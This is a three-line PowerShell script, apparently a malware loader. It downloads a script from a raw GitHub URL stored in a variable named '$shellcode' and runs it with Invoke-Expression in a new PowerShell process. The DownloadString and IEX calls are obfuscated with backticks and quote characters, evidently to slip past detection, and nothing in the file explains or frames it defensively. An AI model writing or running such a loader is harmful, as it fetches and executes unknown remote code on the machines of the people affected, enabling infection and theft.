$shellcode = ("https://raw.githubusercontent.com/s1uiasdad/log-acc-v2/main/scr/download.ps1")
$download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
